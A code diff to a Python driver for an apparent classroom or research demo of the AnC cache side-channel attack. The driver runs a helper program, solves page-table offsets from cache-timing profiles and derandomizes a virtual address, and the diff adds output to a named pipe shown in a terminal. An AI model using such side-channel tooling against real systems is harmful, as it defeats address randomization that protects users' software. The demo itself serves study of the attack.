@@ -7,11 +7,18 @@ import subprocess
 import time
 import shlex
 import sys
+import random
 
 scan_filename = './scan.txt'
 MARGIN_OF_ERROR = 0.8
 NUM_CACHELINE_OFFSETS = 64
 MAX_DELAY_THRESHOLD = 600
+PIPE_PATH = "/home/lucian/secure_software/demo/my_pipe"
+
+if not os.path.exists(PIPE_PATH):
+    os.mkfifo(PIPE_PATH)
+
+subprocess.Popen(['gnome-terminal', '--geometry', '90x62+0+1080', '--zoom=1.2', '-e', 'tail -f %s' % PIPE_PATH])
 
 def find_cacheline_offsets():
 	max_offset = [-1, -1, -1, -1]
@@ -95,8 +102,8 @@ def make_prog():
 	return 0
 	
 
-def run_prog():
-	cmd = "./prog"
+def run_prog(big_offset, small_offset):
+	cmd = "./prog {0} {1}".format(big_offset, small_offset)
 	process = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)
 	(stdoutdata, stderrdata) = process.communicate()
 	exit_code = process.wait()
@@ -104,21 +111,21 @@ def run_prog():
 	return (exit_code, stdoutdata.split(":")[1].strip())
 
 
-def main(word):
+def main(word, big_offset, small_offset):
 	#print("Compiling prog..")
 
 	if make_prog() < 0:
 		return -1
 		
 	#print("Successfully compiled prog")
-	#print("Executing prog, profiling memory accesses..")
+	print("Executing prog, profiling memory accesses..")
 	
-	(exit_code, target_address) = run_prog()
+	(exit_code, target_address) = run_prog(big_offset, small_offset)
 	if exit_code < 0:
 		print("Failed to run prog")
 		return -1
 
-	#print("Finished running prog, solving target address based on memory profiles..")
+	print("Finished running prog, solving target address based on memory profiles..")
 	
 	result = 0
 	offsets = find_cacheline_offsets()
@@ -130,30 +137,33 @@ def main(word):
 	for i in range(4):
 		slot = (offsets[i] << 3) | find_slot_offset(4 - i, offsets)
 		
-		#print("Slot at PTL{0}: {1}".format(4-i, slot))
+		print("Slot at PTL{0}: {1}".format(4-i, slot))
 		
 		if slot < 0:
 			print("Failed to correctly identify offset within cacheline for level {0}".format(4 - i))
 			return
 		
 		result = (result << 9) | slot
-	#print("Target address is {0}".format(target_address))
+	print("Target address is {0}".format(target_address))
 	result = hex(result << 12)
-	#print("\nDerandomized virtual address is {0}".format(result))
+	print("Derandomized virtual address is {0}\n".format(result))
 
+	p = open(PIPE_PATH, "w");
 	if target_address == result:
-		print (word),
-		sys.stdout.flush()
+		p.write(word)
+		p.flush()
 	else: 
-		print("(whoops)"),
-		sys.stdout.flush()
+		p.write("(whoops)")
+		p.flush()
 
 
 if __name__ == "__main__":
-	words = ["Team", "Echo", "proudly", "presents:", "AnC"]
+	words = ["Team ", "Echo ", "proudly ", "presents: ", "AnC!"]
 	start = time.time()
 	for index in range(len(words)):
-		main(words[index])
+		big_offset = random.randint(0, 96)
+		small_offset = random.randint(0, 2048)
+		main(words[index], big_offset, small_offset)
 	stop = time.time()
 	print("\nExecution took {0} seconds".format(stop - start))
 
